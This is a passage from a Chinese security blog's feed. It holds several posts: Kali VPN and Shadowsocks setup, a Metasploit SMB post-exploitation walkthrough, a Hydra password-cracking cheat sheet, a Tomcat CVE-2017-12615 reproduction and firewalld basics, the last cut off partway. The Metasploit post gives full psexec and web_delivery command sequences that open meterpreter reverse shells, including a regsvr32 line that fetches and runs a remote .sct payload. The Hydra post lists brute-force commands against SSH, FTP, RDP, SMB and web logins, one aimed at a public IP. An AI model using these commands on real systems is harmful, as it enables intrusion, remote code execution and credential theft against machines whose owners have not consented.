security and compromise of locks, safes, and keys. <a href="https://github.com/meitar/awesome-lockpicking">https://github.com/meitar/awesome-lockpicking</a></li><li><strong>Awesome Threat Intelligence</strong> a curated list of awesome Threat Intelligence resources. <a href="https://github.com/hslatman/awesome-threat-intelligence">https://github.com/hslatman/awesome-threat-intelligence</a></li><li><strong>APT Notes</strong> Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. <a href="https://github.com/aptnotes/data">https://github.com/aptnotes/data</a></li><li><strong>TIBER-EU FRAMEWORK</strong> The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. <a href="http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf">http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf</a></li><li><strong>CBEST Implementation Guide</strong> CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.<br><a href="https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf">https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf</a></li><li><strong>Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore</strong> The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or “Red Teaming” Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.<br><a href="https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf">https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf</a></li></ul><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p><a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装pptp和shadowsocks客户端</title>
      <link href="/2021/06/08/kali-an-zhuang-pptp-shadowsocks-ke-hu-duan.htm"/>
      <url>/2021/06/08/kali-an-zhuang-pptp-shadowsocks-ke-hu-duan.htm</url>
      
        <content type="html"><![CDATA[<h4 id="kali-安装-pptp-方法"><a href="#kali-安装-pptp-方法" class="headerlink" title="kali 安装 pptp 方法"></a>kali 安装 pptp 方法</h4><h5 id="依次执行以下命令"><a href="#依次执行以下命令" class="headerlink" title="依次执行以下命令"></a>依次执行以下命令</h5><span id="more"></span><pre><code>apt-get install network-manager-openvpn-gnome &amp;&amp; apt-get install network-manager-pptp &amp;&amp; apt-get install network-manager-pptp-gnome &amp;&amp; apt-get install network-manager-strongswan &amp;&amp; apt-get install network-manager-vpnc &amp;&amp; apt-get install network-manager-vpnc-gnome#以上为一条命令来执行cp /etc/network/interfaces /etc/network/interfaces.backup echo &quot;auto lo &quot; &gt; /etc/network/interfaces echo &quot;iface lo inet loopback&quot; &gt;&gt; /etc/network/interfaces /etc/init.d/network-manager restart </code></pre><h4 id="kali安装ss客户端"><a href="#kali安装ss客户端" class="headerlink" title="kali安装ss客户端"></a>kali安装ss客户端</h4><h5 id="Command-line-Client"><a href="#Command-line-Client" class="headerlink" title="Command-line Client"></a>Command-line Client</h5><pre><code>pip install shadowsocksapt-get install shadowsocks-libevcpan Net::Shadowsockssslocal -s 23.154.235.12 -p 8388  -l 1080 -k password -t 600 -m aes-256-cfb</code></pre><p><em>注释：-s 服务器IP，-p为ss配置的端口，-l 本地代理端口，-k为ss配置的密码</em></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> pptp </tag>
            
            <tag> ss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过MSF使用SMB端口远程连接目标的技巧</title>
      <link href="/2021/06/08/msf-smb.htm"/>
      <url>/2021/06/08/msf-smb.htm</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。</p></blockquote><span id="more"></span><h3 id="exploit-windows-smb-psexec"><a href="#exploit-windows-smb-psexec" class="headerlink" title="exploit/windows/smb/psexec"></a>exploit/windows/smb/psexec</h3><p><code>msf &gt; use exploit/windows/smb/psexec</code><br><code>msf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec) &gt; set LPORT 4444</code><br><code>msf exploit(windows/smb/psexec) &gt; exploit</code></p><blockquote><p>执行后有一个session回连<br>经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；<br>当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。</p></blockquote><h3 id="exploit-windows-smb-psexec-psh"><a href="#exploit-windows-smb-psexec-psh" class="headerlink" title="exploit/windows/smb/psexec_psh"></a>exploit/windows/smb/psexec_psh</h3><p><code>msf &gt; use exploit/windows/smb/psexec_psh</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lport 4444</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; exploit</code> </p><h3 id="exploit-multi-script-web-delivery"><a href="#exploit-multi-script-web-delivery" class="headerlink" title="exploit/multi/script/web_delivery"></a>exploit/multi/script/web_delivery</h3><p>使用exploit/multi/script/web_delivery 生成恶意dll代码</p><pre><code>msf &gt; use exploit/multi/script/web_delivery msf exploit(multi/script/web_delivery) &gt; show targets Exploit targets:   Id  Name---   0   Python   1   PHP   2   PSH   3   Regsvr32   4   PSH (Binary)msf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.2.145:4444 [*] Using URL: http://0.0.0.0:8080/s7sa27EEtl[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</code></pre><h3 id="auxiliary-admin-smb-psexec-command"><a href="#auxiliary-admin-smb-psexec-command" class="headerlink" title="auxiliary/admin/smb/psexec_command"></a>auxiliary/admin/smb/psexec_command</h3><p>使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；<br><code>msf &gt; use auxiliary/admin/smb/psexec_command</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; exploit</code></p><p>经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。</p><h3 id="auxiliary-scanner-smb-impacket-wmiexec"><a href="#auxiliary-scanner-smb-impacket-wmiexec" class="headerlink" title="auxiliary/scanner/smb/impacket/wmiexec"></a>auxiliary/scanner/smb/impacket/wmiexec</h3><p><code>msf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexec</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /all</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit</code> </p>]]></content>
      
      
      <categories>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + Next 搭建GitHub page</title>
      <link href="/2021/06/08/hexo-next.htm"/>
      <url>/2021/06/08/hexo-next.htm</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><ul><li>下载node.js并安装 <a href="https://nodejs.org/" title="点击下载安装">官网下载安装</a>默认会安装npm；</li><li>下载安装git <a href="https://git-scm.com/downloads" title="点击下载安装">官网下载安装</a>；</li><li>安装hexo，方法：管理员打开cmd：<br><code>$ npm install -g hexo-cli</code>。</li></ul><span id="more"></span><h2 id="0x01-本地生成hexo文件"><a href="#0x01-本地生成hexo文件" class="headerlink" title="0x01 本地生成hexo文件"></a>0x01 本地生成hexo文件</h2><ul><li>在本地新建一个文件夹 e.g. D:/Hexo ；</li><li>在D:/Hexo目录下鼠标右键”Git Bash Here”，输入：<code>hexo init</code>;</li><li>输入：<code>hexo g</code> 生成静态网页，<code>hexo s</code> 启动本地服务预览；</li><li>完成后Hexo文件夹会生成以下内容：<pre><code>.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes</code></pre></li><li>打开本地浏览器 输入：<code>http://localhost:4000</code> 进行访问。</li></ul><h2 id="0x02-将本地hexo推送到GitHub"><a href="#0x02-将本地hexo推送到GitHub" class="headerlink" title="0x02 将本地hexo推送到GitHub"></a>0x02 将本地hexo推送到GitHub</h2><ul><li>在GitHub上创建名字为 zhangsan.github.io 的项目zhangsan是自己的github用户名；</li><li>打开 <code>D:/Hexo/_config.yml</code> 配置文件，修改以下内容为 <code>http://zhangsan.github.io</code> ：<pre><code># URL## If your site is put in a subdirectory, set url as &#39;http://yoursite.com/child&#39; and root as &#39;/child/&#39;url: http://zhangsan.github.io</code></pre></li><li>打开 <code>D:/Hexo/_config</code>配置文件，在文末的deploy做以下设置：<pre><code>deploy:type: gitrepository: https://github.com/zhangsan/zhangsan.github.io.gitbranch: master</code></pre></li><li>执行：<code>npm install hexo-deployer-git –save</code>  （此命令最好在管理员权限的cmd下执行）；</li><li>执行：hexo clear (一般情况下不用执行这个命令，当网站错误打不开的时候再执行它！)；</li><li>执行：hexo g （本地生成静态文件）；</li><li>执行：hexo d （将本地静态文件推送至Github)；</li><li>期间会弹出github登录框按提示登录即可，登录成功一次往后不用重复登录；</li><li>通过<code>http://zhangsan.github.io</code>即可访问。</li></ul><h2 id="0x03-绑定自己的域名"><a href="#0x03-绑定自己的域名" class="headerlink" title="0x03 绑定自己的域名"></a>0x03 绑定自己的域名</h2><ul><li>域名服务商-控制面板-DNS解析—添加CNAME记录：<br><code>@ &gt;&gt;&gt; zhangsan.github.io</code><center>OR</center>`www >>> zhangsan.github.io`</li><li>在<code>Hexo/sorce</code>新建CNAME文件写入域名，CNAME文件，注意没有文件后缀；</li><li>执行：hexo g</li><li>执行：hexo s（本地预览，可以跳过）</li><li>执行：hexo d</li></ul><h2 id="0x04-使用next主题并给网站添加浏览器logo"><a href="#0x04-使用next主题并给网站添加浏览器logo" class="headerlink" title="0x04 使用next主题并给网站添加浏览器logo"></a>0x04 使用next主题并给网站添加浏览器logo</h2><ul><li>主题下载，<a href="https://github.com/iissnan/hexo-theme-next">next在github下载</a>，并把next文件夹放到temes文件夹；</li><li>使用next主题，编辑<code>Hexo/_config.yml</code>以下内容：<br><code>##Themes: https://hexo.io/themes/</code><br><code>theme: next</code></li><li>将尺寸为32x32 favicon.ico 文件放在<code>hexo/source/</code>文件夹内，然后修改<code>Hexo\themes\next\_config.yml</code>为：<pre><code># Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico</code></pre></li><li>编辑<code>Hexo/_config.yml</code>以下内容：<pre><code># Place your favicon.ico to /source directory.favicon: /favicon.ico</code></pre></li></ul><h2 id="0x05-将网站显示为中文"><a href="#0x05-将网站显示为中文" class="headerlink" title="0x05 将网站显示为中文"></a>0x05 将网站显示为中文</h2><ul><li>编辑<code>D:/Hexo/_config.yml</code>配置文件：<pre><code>language: zh-Hans  #将默认改成zh-Hanstimezone:</code></pre></li><li>在<code>Hexo/next/lanhuages</code>目录下的zh-Hans.yml文件可以自行修改，增加和删除。</li></ul><h2 id="0x06-添加菜单和自定义菜单前的图标"><a href="#0x06-添加菜单和自定义菜单前的图标" class="headerlink" title="0x06 添加菜单和自定义菜单前的图标"></a>0x06 添加菜单和自定义菜单前的图标</h2><ul><li>编辑<code>themes\next\_config.yml</code>，到menu:字段，在该字段下添加一个字段；<pre><code>menu:home: /about: /about......</code></pre></li><li>自定义小图标，关于next使用的小图标你可以通过这个网站<a href="http://fontawesome.io/icons/">Font Awesome</a>来查看自己喜欢的图标，然后copy图标名，编辑<code>Hexo\themes\next\_config.yml</code>，将对应的图标名换成自己喜欢的小图标；<pre><code>menu_icons:enable: true#KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesomehome: homeabout: mortar-boardcategories: smile-oschedule: calendartags: diamondarchives: angellistsitemap: sitemapcommonweal: heartbeat</code></pre></li></ul><h2 id="0x07-隐藏网页底部powered-By-Hexo-强力驱动"><a href="#0x07-隐藏网页底部powered-By-Hexo-强力驱动" class="headerlink" title="0x07 隐藏网页底部powered By Hexo / 强力驱动"></a>0x07 隐藏网页底部powered By Hexo / 强力驱动</h2><p> 打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。</p><pre><code>&lt;!--&lt;div class=&quot;powered-by&quot;&gt;  &#123;&#123; __('footer.powered', '<a class="theme-link" rel="external nofollow" href="https://hexo.io">Hexo</a>') &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt;  &#123;&#123; __('footer.theme') &#125;&#125; -  &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;    NexT.&#123;&#123; theme.scheme &#125;&#125;  &lt;/a&gt;&lt;/div&gt;</code></pre><h2 id="0x08-增加本地搜索功能"><a href="#0x08-增加本地搜索功能" class="headerlink" title="0x08 增加本地搜索功能"></a>0x08 增加本地搜索功能</h2><p>安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：<br><code>$ npm install hexo-generator-searchdb --save</code><br>如果报错多执行几次，有的时候是网络原因，最好在管理员权限下的cmd里执行npm安装命令。<br>编辑<code>Hexo/_config.yml</code>，新增以下内容：</p><pre><code>search:  path: search.xml  field: post  format: html  limit: 10000</code></pre><h2 id="0x09-使用来必力评论功能"><a href="#0x09-使用来必力评论功能" class="headerlink" title="0x09 使用来必力评论功能"></a>0x09 使用来必力评论功能</h2><ul><li>到<a href="https://livere.com/">livere</a>注册账号，安装来必力，记录以下内容：<center>![记录uid](/uploads/livere2.png)</center></li><li>在<code>next/_config.yml</code>的此处加上自己的livere的uid：<br><code>livere_uid: your uid</code></li><li>然后去博客查看吧文章下面会看到以下景象：<center>![livere设置完成](/uploads/livere1.png)</center></li></ul><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p>(<a href="https://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/">https://thief.one/2017/03/03/Hexo搭建博客教程/</a>)</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra 的使用</title>
      <link href="/2021/06/08/hydra-de-shi-yong.htm"/>
      <url>/2021/06/08/hydra-de-shi-yong.htm</url>
      
        <content type="html"><![CDATA[<p>字典集<br><a href="https://www.weakpass.com/">https://www.weakpass.com/</a><br>1.破解ssh<br>（1）破解指定用户名密码</p><blockquote><p>hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ssh -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><span id="more"></span><p>（2）批量破解ssh账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -V<br>hydra -L list_user -P list_password 192.168.56.101 ssh -V</p></blockquote><p>2.破解ftp</p><p>（1）破解指定用户名密码</p><blockquote><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><p>（2）批量破解FTP账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -V<br>hydra -L list_user -P list_password 192.168.56.101 ftp -V</p></blockquote><p>3．GET方式提交，破解Web登录</p><blockquote><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</p></blockquote><p> 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录</p><p>（1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password”</p><blockquote><p>hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V</p></blockquote><p>（2）对admin密码进行破解</p><blockquote><p>hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“</p></blockquote><p>“-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解；</p><p>5．破解HTTPS</p><blockquote><p>hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https</p></blockquote><p>6．破解teamspeak</p><blockquote><p>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</p></blockquote><p>7．破解Cisco</p><blockquote><p>hydra -P pass.txt 192.168.0.115 cisco<br>hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable</p></blockquote><p>8．破解SMB</p><blockquote><p>hydra -l administrator -P pass.txt 192.168.0.115 smb</p></blockquote><p>9．破解POP3</p><blockquote><p>hydra -l muts -P pass.txt my.pop3.mail pop3</p></blockquote><p>10．破解远程终端账号</p><p>（1）破解管理员账号</p><blockquote><p>hydra ip rdp -l administrator -P pass.txt -V</p></blockquote><p>（2）批量破解账号</p><blockquote><p>hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt –V</p></blockquote><p>11．破解HTTP-Proxy</p><blockquote><p>hydra -l admin -P pass.txt http-proxy://192.168.0.115</p></blockquote><p>12．破解IMAP</p><blockquote><p>hydra -L user.txt -p secret 192.168.0.115 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-12615漏洞复现</title>
      <link href="/2021/06/08/cve-2017-12615.htm"/>
      <url>/2021/06/08/cve-2017-12615.htm</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式:"></a><strong>漏洞利用条件和方式:</strong></h2><ul><li><p>CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。</p><span id="more"></span></li></ul><p>CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80</p><p>CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79</p><h2 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h2><p><img src="/uploads/tom1.png"></p><p><strong>U:test</strong></p><p><strong>P:test123</strong></p><p><img src="/uploads/tom2.png"></p><blockquote><p><strong>JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25</strong></p><p><strong>CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></p><p><strong>Path=  %JAVA_HOME%/bin</strong></p></blockquote><p><strong>新增2个变量</strong></p><blockquote><p>CATALINA_HOME= tomcat路径</p><p>CATALINA_BASE= tomcat路径</p><p>CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar</p></blockquote><p>1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置</p><p> 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成”</p><p>3、Server.xml</p><pre><code>           &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;           connectionTimeout=&quot;20000&quot;           redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt;</code></pre><p>C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml</p><p>增加</p><pre><code>       &lt;init-param&gt;       &lt;param-name&gt;readonly&lt;/param-name&gt;        &lt;param-value&gt;false&lt;/param-value&gt;    &lt;/init-param&gt;</code></pre><p><img src="/uploads/tom3.png"></p><p><img src="/uploads/tom4.png"></p><p><img src="/uploads/tom5.png"></p><p><img src="/uploads/tom6.png"></p><p><img src="/uploads/tom7.png"></p><p><img src="/uploads/tom8.png"></p><p><img src="/uploads/tom9.png"></p><p><img src="/uploads/tom10.png"></p><blockquote><p>提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制：</p></blockquote><p><img src="/uploads/tom11.png"></p><p><em><strong>7.0.81</strong></em></p><p><img src="/uploads/tom12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 7 安装 Shadowscoks</title>
      <link href="/2021/06/08/centos-7-an-zhuang-shadowscoks.htm"/>
      <url>/2021/06/08/centos-7-an-zhuang-shadowscoks.htm</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先安装 pip ，使用 pip 安装 Shadowsocks </p><span id="more"></span><pre class="line-numbers language-commonlisp"><code class="language-commonlisp">yum updateyum upgradeyum install python-pippip install shadowsocks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>新建 Shadowsocks 的配置文件</p><pre class="line-numbers language-cmd"><code class="language-cmd">vim /etc/shadowsocks.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编辑 Shadowocks 配置文件</p></li><li><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"server"</span><span class="token operator">:</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"server_port"</span><span class="token operator">:</span><span class="token number">1111</span><span class="token punctuation">,</span>    <span class="token property">"local_address"</span><span class="token operator">:</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"local_port"</span><span class="token operator">:</span><span class="token number">1080</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"yourpassword"</span><span class="token punctuation">,</span>    <span class="token property">"timeout"</span><span class="token operator">:</span><span class="token number">300</span><span class="token punctuation">,</span>    <span class="token property">"method"</span><span class="token operator">:</span><span class="token string">"aes-256-cfb"</span><span class="token punctuation">,</span>    <span class="token property">"fast_open"</span><span class="token operator">:</span> <span class="token boolean">false</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置firewall，允许 Shadowsocks 服务端口被外网访问</p><pre class="line-numbers language-cmd"><code class="language-cmd">以下命令会永久生效firewall-cmd --zone=public --add-port=1111/tcp --permanent重新载入 firewallfirewall-cmd --reload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>启动 ssserver 服务</p><pre><code>ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d restartssserver -c /etc/shadowsocks.json -d stop</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> vps，SS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> shadowscoks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7 使用 Firewalld 打开关闭防火墙与端口</title>
      <link href="/2021/06/08/centos7-firewalld.htm"/>
      <url>/2021/06/08/centos7-firewalld.htm</url>
      
        <content type="html"><![CDATA[<h2 id="firewalld的基本使用"><a href="#firewalld的基本使用" class="headerlink" title="firewalld的基本使用"></a>firewalld的基本使用</h2><span id="more"></span><pre class="line-numbers language-cmd"><code class="language-cmd">启动： systemctl start firewalld （service firewalld start）关闭： systemctl stop firewalld  （service firewalld stop）查看状态： systemctl status firewalld 开机禁用  ： systemctl disable firewalld开机启用  ： systemctl enable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"><a href="#systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。" class="headerlink" title="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"></a>systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。</h2><pre class="line-numbers language-cmd"><code class="language-cmd">启动一个服务：systemctl start firewalld.service关闭一个服务：systemctl stop firewalld.service重启一个服务：systemctl restart firewalld.service显示一个服务的状态：systemctl status firewalld.service在开机时启用一个服务：systemctl enable firewalld.service在开机时禁用一个服务：systemctl disable firewalld.service查看服务是否开机启动：systemctl is-enabled firewalld.service查看已启动的服务列表：systemctl list-unit-files|grep enabled查看启动失败的服务列表：systemctl --failed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置firewalld-cmd"><a href="#配置firewalld-cmd" class="headerlink" title="配置firewalld-cmd"></a>配置firewalld-cmd</h2><pre class="line-numbers language-cmd"><code class="language-cmd">查看版本： firewall-cmd --version查看帮助： firewall-cmd --help显示状态： firewall-cmd --state查看所有打开的端口： firewall-cmd --zone=public --list-ports更新防火墙规则： firewall-cmd --reload查看区域信息:  firewall-cmd --get-active-zones查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0拒绝所有包：firewall-cmd --panic-on取消拒绝状态： firewall-cmd --panic-off查看是否拒绝： firewall-cmd --query-panic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对一个端口的开启-查看-删除操作"><a href="#对一个端口的开启-查看-删除操作" class="headerlink" 